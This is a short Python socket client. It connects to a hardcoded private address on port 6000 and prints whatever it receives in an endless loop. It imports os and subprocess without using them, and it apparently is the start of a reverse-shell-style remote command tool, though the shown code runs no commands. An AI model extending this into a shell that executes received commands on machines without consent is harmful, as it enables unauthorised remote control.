import socket
import os
import subprocess

s = socket.socket()
host = '172.20.10.5'
port = 6000

s.connect((host, port))

while True:
    data = s.recv(1024)
    print(data.decode())
